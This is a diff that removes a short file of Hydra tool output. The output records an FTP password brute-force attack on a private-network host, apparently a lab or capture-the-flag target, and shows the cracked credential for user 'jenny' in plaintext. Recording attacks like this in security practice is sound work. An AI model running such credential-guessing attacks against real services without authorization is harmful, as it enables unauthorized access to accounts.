@@ -1,8 +1,0 @@
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-02 21:40:52
-[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
-[DATA] attacking ftp://10.10.85.40:21/
-[21][ftp] host: 10.10.85.40   login: jenny   password: 987654321
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-02 21:41:12
